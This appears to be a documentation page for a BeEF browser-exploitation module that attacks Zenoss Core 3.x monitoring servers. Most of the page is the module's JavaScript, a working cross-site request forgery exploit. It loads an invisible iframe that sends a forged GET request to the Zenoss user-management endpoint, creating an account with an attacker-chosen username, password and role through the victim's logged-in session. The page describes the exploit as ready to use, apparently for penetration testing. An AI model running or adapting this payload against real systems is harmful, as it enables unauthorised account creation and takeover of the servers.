## Summary

* **Objective**: add a user to a Zenoss Core 3.x server
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/zenoss_add_user_csrf)

## Internal Working

Uses an invisible iframe with a GET request to add an user account

```js
  var base = '<%= @base %>';
  var user_level = '<%= @user_level %>';
  var username = '<%= @username %>';
  var password = '<%= @password %>';

  var zenoss_add_user_iframe = beef.dom.createInvisibleIframe();
  zenoss_add_user_iframe.setAttribute('src', base+'/zport/dmd/ZenUsers?tableName=userlist&zenScreenName=manageUserFolder.pt&manage_addUser%3Amethod=OK&defaultAdminRole='+user_level+'&roles%3Alist='+user_level+'&userid='+username+'&password='+password);

```

## Feedback

